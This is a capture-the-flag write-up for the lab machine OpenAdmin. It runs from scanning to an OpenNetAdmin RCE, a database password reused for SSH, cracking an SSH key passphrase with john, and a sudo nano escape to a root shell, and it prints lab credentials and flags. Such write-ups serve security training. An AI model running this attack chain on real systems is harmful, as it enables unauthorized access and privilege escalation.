### nmap result

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 4b:98:df:85:d1:7e:f0:3d:da:48:cd:bc:92:00:b7:54 (RSA)
|   256 dc:eb:3d:c9:44:d1:18:b1:22:b4:cf:de:bd:6c:7a:54 (ECDSA)
|_  256 dc:ad:ca:3c:11:31:5b:6f:e6:a4:89:34:7c:9b:e5:50 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET POST OPTIONS HEAD
|_http-title: Apache2 Ubuntu Default Page: It works
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

### enum

Feroxbuster result

```
http://10.10.10.171/artwork/
http://10.10.10.171/music/
http://10.10.10.171/sierra/
```

and by going to `music` we can see a login page and it redirects to `/ona` and by going to that page.

It redirects to `OpenNetAdmin` and the version `18.1.1` is vulnerable to a RCE attack. https://github.com/amriunix/ona-rce

and by locating `database` we can see a file named `/opt/ona/www/local/config/database_settings.inc.php` that we can `cat` into

```
<?php

$ona_contexts=array (
  'DEFAULT' => 
  array (
    'databases' => 
    array (
      0 => 
      array (
        'db_type' => 'mysqli',
        'db_host' => 'localhost',
        'db_login' => 'ona_sys',
        'db_passwd' => 'n1nj4W4rri0R!',
        'db_database' => 'ona_default',
        'db_debug' => false,
      ),
    ),
    'description' => 'Default data context',
    'context_color' => '#D3DBFF',
  ),
);
```

We can try if a user reuse the password that is in the database.

```
sh$ cat /etc/passwd | grep -n 'bash'
1:root:x:0:0:root:/root:/bin/bash
30:jimmy:x:1000:1000:jimmy:/home/jimmy:/bin/bash
32:joanna:x:1001:1001:,,,:/home/joanna:/bin/bash
```

We can see that the user `jimmy` uses the password that is in the database file

`jimmy:n1nj4W4rri0R!`

#### linpeas result

```
╔══════════╣ Unexpected in /opt (usually empty)
total 12                                                                                                            
drwxr-xr-x  3 root     root     4096 Jan  4  2020 .
drwxr-xr-x 24 root     root     4096 Aug 17  2021 ..
drwxr-x---  7 www-data www-data 4096 Nov 21  2019 ona
-rw-r--r--  1 root     root        0 Nov 22  2019 priv

╔══════════╣ Checking 'sudo -l', /etc/sudoers, and /etc/sudoers.d
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-and-suid                                    
Sudoers file: /etc/sudoers.d/joanna is readable                                                                     
joanna ALL=(ALL) NOPASSWD:/bin/nano /opt/priv
```

We see an interesting files inside `/etc/apache2/sites-enabled` we can check the `internal.conf` and then we can see that the assigned user is `joanna`.
We will test `curl` command and see if we can get an interesting result.

We see a RSA private key is available. We will copy it and create a file and check if we can ssh under `joanna` 

```
jimmy@openadmin:/var/www/internal$ curl http://127.0.0.1:52846/main.php
<pre>-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,2AF25344B8391A25A9B318F3FD767D6D

kG0UYIcGyaxupjQqaS2e1HqbhwRLlNctW2HfJeaKUjWZH4usiD9AtTnIKVUOpZN8
ad/StMWJ+MkQ5MnAMJglQeUbRxcBP6++Hh251jMcg8ygYcx1UMD03ZjaRuwcf0YO
ShNbbx8Euvr2agjbF+ytimDyWhoJXU+UpTD58L+SIsZzal9U8f+Txhgq9K2KQHBE
6xaubNKhDJKs/6YJVEHtYyFbYSbtYt4lsoAyM8w+pTPVa3LRWnGykVR5g79b7lsJ
ZnEPK07fJk8JCdb0wPnLNy9LsyNxXRfV3tX4MRcjOXYZnG2Gv8KEIeIXzNiD5/Du
y8byJ/3I3/EsqHphIHgD3UfvHy9naXc/nLUup7s0+WAZ4AUx/MJnJV2nN8o69JyI
9z7V9E4q/aKCh/xpJmYLj7AmdVd4DlO0ByVdy0SJkRXFaAiSVNQJY8hRHzSS7+k4
piC96HnJU+Z8+1XbvzR93Wd3klRMO7EesIQ5KKNNU8PpT+0lv/dEVEppvIDE/8h/
/U1cPvX9Aci0EUys3naB6pVW8i/IY9B6Dx6W4JnnSUFsyhR63WNusk9QgvkiTikH
40ZNca5xHPij8hvUR2v5jGM/8bvr/7QtJFRCmMkYp7FMUB0sQ1NLhCjTTVAFN/AZ
fnWkJ5u+To0qzuPBWGpZsoZx5AbA4Xi00pqqekeLAli95mKKPecjUgpm+wsx8epb
9FtpP4aNR8LYlpKSDiiYzNiXEMQiJ9MSk9na10B5FFPsjr+yYEfMylPgogDpES80
X1VZ+N7S8ZP+7djB22vQ+/pUQap3PdXEpg3v6S4bfXkYKvFkcocqs8IivdK1+UFg
S33lgrCM4/ZjXYP2bpuE5v6dPq+hZvnmKkzcmT1C7YwK1XEyBan8flvIey/ur/4F
FnonsEl16TZvolSt9RH/19B7wfUHXXCyp9sG8iJGklZvteiJDG45A4eHhz8hxSzh
Th5w5guPynFv610HJ6wcNVz2MyJsmTyi8WuVxZs8wxrH9kEzXYD/GtPmcviGCexa
RTKYbgVn4WkJQYncyC0R1Gv3O8bEigX4SYKqIitMDnixjM6xU0URbnT1+8VdQH7Z
uhJVn1fzdRKZhWWlT+d+oqIiSrvd6nWhttoJrjrAQ7YWGAm2MBdGA/MxlYJ9FNDr
1kxuSODQNGtGnWZPieLvDkwotqZKzdOg7fimGRWiRv6yXo5ps3EJFuSU1fSCv2q2
XGdfc8ObLC7s3KZwkYjG82tjMZU+P5PifJh6N0PqpxUCxDqAfY+RzcTcM/SLhS79
yPzCZH8uWIrjaNaZmDSPC/z+bWWJKuu4Y1GCXCqkWvwuaGmYeEnXDOxGupUchkrM
+4R21WQ+eSaULd2PDzLClmYrplnpmbD7C7/ee6KDTl7JMdV25DM9a16JYOneRtMt
qlNgzj0Na4ZNMyRAHEl1SF8a72umGO2xLWebDoYf5VSSSZYtCNJdwt3lF7I8+adt
z0glMMmjR2L5c2HdlTUt5MgiY8+qkHlsL6M91c4diJoEXVh+8YpblAoogOHHBlQe
K1I1cqiDbVE/bmiERK+G4rqa0t7VQN6t2VWetWrGb+Ahw/iMKhpITWLWApA3k9EN
-----END RSA PRIVATE KEY-----
</pre><html>
<h3>Don't forget your "ninja" password</h3>
Click here to logout <a href="logout.php" tite = "Logout">Session
</html>
```

We tried but it is asking for a password

```
└─# ssh joanna@10.10.10.171 -i joanna-priv          
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@         WARNING: UNPROTECTED PRIVATE KEY FILE!          @
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
Permissions 0644 for 'joanna-priv' are too open.
It is required that your private key files are NOT accessible by others.
This private key will be ignored.
Load key "joanna-priv": bad permissions
joanna@10.10.10.171's password: 
Permission denied, please try again.
joanna@10.10.10.171's password: 
Permission denied, please try again.
joanna@10.10.10.171's password: 
joanna@10.10.10.171: Permission denied (publickey,password).
```

We will try and use a tool called `ssh2john`

`/usr/share/john/ssh2john.py joanna-priv >> joanna.hash`

Then use `john` to crack the hash.

```
john --wordlist=/usr/share/wordlists/rockyou.txt joanna.hash                       
Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
bloodninjas      (joanna-priv)     
1g 0:00:00:01 DONE (2023-11-02 22:41) 0.5154g/s 4935Kp/s 4935Kc/s 4935KC/s bloodofyouth..bloodmore23
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```

SSH as `joanna` with the RSA private key and the cracked password.

```
joanna@openadmin:~$ cat user.txt 
16c41b612cf7fcc38217eab00c99cce3
```

#### sudo -l

```
joanna@openadmin:~$ sudo -l
Matching Defaults entries for joanna on openadmin:
    env_keep+="LANG LANGUAGE LINGUAS LC_* _XKB_CHARSET", env_keep+="XAPPLRESDIR XFILESEARCHPATH
    XUSERFILESEARCHPATH", secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin,
    mail_badpass

User joanna may run the following commands on openadmin:
    (ALL) NOPASSWD: /bin/nano /opt/priv
```

By looking at GTFOBins. we can spawn a shell inside `nano`

#### Shell

It can be used to break out from restricted environments by spawning an interactive system shell.

```
    nano
    ^R^X
    reset; sh 1>&0 2>&0
```

#### nano

```
Command to execute: reset; sh 1>&0 2>&0                                                                             
^G Get Help                                               ^X Read File
# # # cel                                                 M-F New Buffer
# 
# 
# 
# id
uid=0(root) gid=0(root) groups=0(root)
# cd /root
# cat root.txt
1a9b499c6c6161a4607309478e0b09ef
# 
```

